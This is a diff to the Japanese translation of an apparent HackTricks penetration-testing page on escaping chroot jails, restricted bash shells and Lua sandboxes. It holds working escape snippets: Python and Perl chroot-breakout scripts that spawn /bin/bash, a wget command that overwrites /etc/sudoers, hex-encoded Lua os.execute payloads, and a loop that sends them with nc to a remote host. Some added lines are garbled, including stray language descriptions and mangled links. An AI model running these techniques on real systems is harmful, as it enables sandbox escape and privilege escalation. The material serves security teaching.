@@ -1,42 +1,42 @@
-# 制限された環境からの脱出
+# ジェイルからの脱出
 
 {% hint style="success" %}
-AWSハッキングの学習と練習:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCPハッキングの学習と練習: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>HackTricksのサポート</summary>
+<summary>HackTricksをサポートする</summary>
 
-* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
-* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して**ハッキングテクニックを共有**してください。
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **ハッキングトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
 {% endhint %}
 
 ## **GTFOBins**
 
-**"Shell"プロパティを持つバイナリを実行できるかどうかを調べる** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **で検索**
+**"Shell"プロパティを持つバイナリを実行できるかどうか、[**https://gtfobins.github.io/**](https://gtfobins.github.io)で検索してください。**
 
 ## Chrootの脱出
 
-[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)から: chrootメカニズムは、特権を持つ（root）ユーザーによる意図的な改ざんに対抗するためには**意図されていません**。ほとんどのシステムでは、chrootコンテキストは適切にスタックされず、特権を持つchrootedプログラムは**2番目のchrootを実行して脱出する**ことができます。\
-通常、これは脱出するためにchroot内でrootである必要があることを意味します。
+[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)から：chrootメカニズムは、**特権**（**root**）**ユーザーによる意図的な改ざんに対して防御することを目的としていません**。ほとんどのシステムでは、chrootコンテキストは正しくスタックされず、**十分な特権を持つchrootされたプログラムは、脱出するために二度目のchrootを実行することができます**。\
+通常、脱出するにはchroot内でrootである必要があります。
 
 {% hint style="success" %}
-**ツール** [**chw00t**](https://github.com/earthquake/chw00t) は、以下のシナリオを悪用して`chroot`から脱出するために作成されました。
+**ツール** [**chw00t**](https://github.com/earthquake/chw00t)は、以下のシナリオを悪用して`chroot`から脱出するために作成されました。
 {% endhint %}
 
 ### Root + CWD
 
 {% hint style="warning" %}
-chroot内で**root**である場合、**別のchroot**を作成して**脱出**することができます。これはLinuxでは2つのchrootが同居できないためです。つまり、新しいフォルダを作成し、その新しいフォルダで**新しいchroot**を作成すると、**新しいchrootの外側**になり、その結果、FS内にいることになります。
+chroot内で**root**である場合、**別のchrootを作成することで脱出できます**。これは、2つのchrootが共存できないため（Linuxでは）、フォルダーを作成し、その新しいフォルダー上で**新しいchrootを作成すると、**その外にいるあなたは**新しいchrootの外にいることになります**。したがって、ファイルシステム内にいることになります。
 
-通常、chrootは作業ディレクトリを指定されたディレクトリに移動させないため、chrootを作成できますが、その外側にいることができます。
+これは通常、chrootが作業ディレクトリを指定されたものに移動しないために発生します。したがって、chrootを作成できますが、その外にいることができます。
 {% endhint %}
 
-通常、chrootジェイル内には`chroot`バイナリが見つからない場合がありますが、バイナリをコンパイル、アップロード、実行することができます:
+通常、chrootジェイル内には`chroot`バイナリは見つかりませんが、**バイナリをコンパイル、アップロード、実行することができます**：
 
 <details>
 
@@ -63,7 +63,8 @@ system("/bin/bash");
 
 <details>
 
-<summary>Python</summary>
+<summary>Python</summary>  
+Python（パイソン）は、広く使用されている高水準プログラミング言語です。シンプルで読みやすい構文を持ち、さまざまな用途に適しています。
 ```python
 #!/usr/bin/python
 import os
@@ -78,7 +79,7 @@ os.system("/bin/bash")
 
 <details>
 
-<summary>Perl</summary>
+<summary>Perl</summary>パール
 ```perl
 #!/usr/bin/perl
 mkdir "chroot-dir";
@@ -91,10 +92,10 @@ system("/bin/bash");
 ```
 </details>
 
-### ルート + 保存されたfd
+### Root + Saved fd
 
 {% hint style="warning" %}
-これは前のケースと似ていますが、この場合、**攻撃者は現在のディレクトリへのファイルディスクリプタを保存**し、その後**新しいフォルダ内でchrootを作成**します。最後に、彼はchrootの外でその**FDにアクセス**できるため、それにアクセスして**脱出**します。
+これは前のケースに似ていますが、この場合、**攻撃者は現在のディレクトリへのファイルディスクリプタを保存し**、その後**新しいフォルダにchrootを作成します**。最後に、彼は**chrootの外でそのFDにアクセスできるため**、それにアクセスし、**脱出**します。
 {% endhint %}
 
 <details>
@@ -125,52 +126,53 @@ chroot(".");
 ### Root + Fork + UDS (Unix Domain Sockets)
 
 {% hint style="warning" %}
-FDはUnixドメインソケットを介して渡すことができるので:
+FDはUnixドメインソケットを介して渡すことができるので：
 
-* 子プロセスを作成（fork）
-* 親と子が通信できるようにUDSを作成
-* 子プロセスで異なるフォルダにchrootを実行
-* 親プロセスで、新しい子プロセスのchrootの外にあるフォルダのFDを作成
+* 子プロセスを作成する（フォーク）
+* 親と子が通信できるようにUDSを作成する
+* 子プロセスで異なるフォルダにchrootを実行する
+* 親プロセスで、新しい子プロセスのchrootの外にあるフォルダのFDを作成する
 * UDSを使用してそのFDを子プロセスに渡す
-* 子プロセスはそのFDにchdirし、chrootの外にあるため、牢獄から脱出します
+* 子プロセスはそのFDにchdirし、chrootの外にいるため、監獄から脱出する
 {% endhint %}
 
 ### Root + Mount
 
 {% hint style="warning" %}
-* ルートデバイス（/）をchroot内のディレクトリにマウント
-* そのディレクトリにchroot
+* ルートデバイス（/）をchroot内のディレクトリにマウントする
+* そのディレクトリにchrootする
+
 これはLinuxで可能です
 {% endhint %}
 
 ### Root + /proc
 
 {% hint style="warning" %}
-* procfsをchroot内のディレクトリにマウント（まだマウントされていない場合）
-* /proc/1/rootのように異なるルート/cwdエントリを持つpidを探す
-* そのエントリにchroot
+* procfsをchroot内のディレクトリにマウントする（まだであれば）
+* 異なるroot/cwdエントリを持つpidを探す、例えば：/proc/1/root
+* そのエントリにchrootする
 {% endhint %}
 
 ### Root(?) + Fork
 
 {% hint style="warning" %}
-* フォーク（子プロセス）を作成し、FS内の異なるフォルダにchrootし、そのフォルダにCDします
-* 親プロセスから、子プロセスがいるフォルダを、子プロセスのchrootの前のフォルダに移動します
-* この子プロセスは、chrootの外にいることに気づくでしょう
+* フォーク（子プロセス）を作成し、FSのより深い異なるフォルダにchrootし、その上でCDする
+* 親プロセスから、子プロセスがいるフォルダを子のchrootの前のフォルダに移動する
+* この子プロセスはchrootの外にいることになる
 {% endhint %}
 
 ### ptrace
 
 {% hint style="warning" %}
-* 以前はユーザーが自分自身のプロセスを自分自身のプロセスからデバッグできましたが、これはデフォルトではもはや可能ではありません
-* とにかく、可能であれば、プロセスにptraceしてその中でシェルコードを実行できます（[この例を参照](linux-capabilities.md#cap\_sys\_ptrace)）。
+* 以前はユーザーが自分のプロセスを自分のプロセスからデバッグできましたが... これはデフォルトではもはや可能ではありません
+* それでも、可能であれば、プロセスにptraceし、その中でシェルコードを実行することができます（[この例を参照](linux-capabilities.md#cap\_sys\_ptrace)）。
 {% endhint %}
 
 ## Bash Jails
 
 ### Enumeration
 
-牢獄に関する情報を取得します:
+監獄に関する情報を取得する：
 ```bash
 echo $SHELL
 echo $PATH
@@ -178,29 +180,29 @@ env
 export
 pwd
 ```
-### PATHの変更
+### PATHを変更する
 
-PATH環境変数を変更できるかどうかを確認します
+PATH環境変数を変更できるか確認してください。
 ```bash
 echo $PATH #See the path of the executables that you can use
 PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
 echo /home/* #List directory
 ```
-### vimの使用
+### vimを使用する
 ```bash
 :set shell=/bin/sh
 :shell
 ```
-### スクリプトの作成
+### スクリプトを作成
 
-_/bin/bash_ を内容とする実行可能ファイルを作成できるかどうかを確認します。
+_/bin/bash_ を内容とする実行可能ファイルを作成できるか確認してください。
 ```bash
 red /bin/bash
 > w wx/path #Write /bin/bash in a writable and executable path
 ```
-### SSH経由でbashを取得
+### SSH経由でbashを取得する
 
-SSH経由でアクセスしている場合、次のトリックを使用してbashシェルを実行できます：
+ssh経由でアクセスしている場合、このトリックを使用してbashシェルを実行できます：
 ```bash
 ssh -t user@<IP> bash # Get directly an interactive shell
 ssh user@<IP> -t "bash --noprofile -i"
@@ -214,55 +216,47 @@ BASH_CMDS[shell]=/bin/bash;shell -i
 ```
 ### Wget
 
-例えばsudoersファイルを上書きすることができます。
+例えば、sudoersファイルを上書きすることができます。
 ```bash
 wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 ```
 ### その他のトリック
 
 [**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
-[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
-[https://gtfobins.github.io](https://gtfobins.github.io)\
-**興味深いページも次のとおりです:**
+[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
+[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
+**興味深いページもあります:**
 
 {% content-ref url="../bypass-bash-restrictions/" %}
 [bypass-bash-restrictions](../bypass-bash-restrictions/)
 {% endcontent-ref %}
 
-## Python Jails
+## Python ジェイル
 
-Pythonジェイルからの脱出に関するトリックは、次のページにあります:
+次のページでは、python ジェイルからの脱出に関するトリックがあります:
 
 {% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
 [bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
 {% endcontent-ref %}
 
-## Lua Jails
+## Lua ジェイル
 
-このページでは、Lua内でアクセス可能なグローバル関数を見つけることができます: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)
+このページでは、lua 内でアクセスできるグローバル関数を見つけることができます: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)
 
-**コマンド実行付きのEval:**
+**コマンド実行を伴う Eval:**
 ```bash
 load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
 ```
-いくつかのトリックを**ドットを使用せずにライブラリの関数を呼び出す方法**：
+いくつかのトリック **ドットを使わずにライブラリの関数を呼び出す**:
 ```bash
 print(string.char(0x41, 0x42))
 print(rawget(string, "char")(0x41, 0x42))
 ```
-列挙されたライブラリの機能：
-
-```html
-<ol>
-<li>関数1</li>
-<li>関数2</li>
-<li>関数3</li>
-</ol>
-```
+ライブラリの関数を列挙する:
 ```bash
 for k,v in pairs(string) do print(k,v) end
 ```
-注意してください。**異なるLua環境で前のワンライナーを実行するたびに、関数の順序が変わります**。したがって、特定の関数を実行する必要がある場合は、異なるLua環境をロードしてleライブラリの最初の関数を呼び出すブルートフォース攻撃を実行できます：
+注意してください。**異なるlua環境で前のワンライナーを実行するたびに、関数の順序が変わります**。したがって、特定の関数を実行する必要がある場合は、異なるlua環境をロードし、leライブラリの最初の関数を呼び出すことでブルートフォース攻撃を行うことができます。
 ```bash
 #In this scenario you could BF the victim that is generating a new lua environment
 #for every interaction with the following line and when you are lucky
@@ -273,7 +267,7 @@ for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
 #and "char" from string library, and the use both to execute a command
 for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
 ```
-**インタラクティブなluaシェルを取得する**: もし制限されたluaシェル内にいる場合、以下を呼び出すことで新しいluaシェル（そして恐らく制限のないもの）を取得できます。
+**インタラクティブなluaシェルを取得する**: 制限されたluaシェル内にいる場合は、次のように呼び出すことで新しいluaシェル（できれば無制限）を取得できます:
 ```bash
 debug.debug()
 ```
@@ -282,16 +276,16 @@ debug.debug()
 * [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (スライド: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))
 
 {% hint style="success" %}
-AWSハッキングの学習と練習:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCPハッキングの学習と練習: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWSハッキングを学び、実践する:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、実践する: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>HackTricksのサポート</summary>
+<summary>HackTricksをサポートする</summary>
 
-* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
-* **HackTricks**と**HackTricks Cloud**のGitHubリポジトリにPRを提出して、ハッキングトリックを共有してください。
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを送信してください。**
 
 </details>
 {% endhint %}
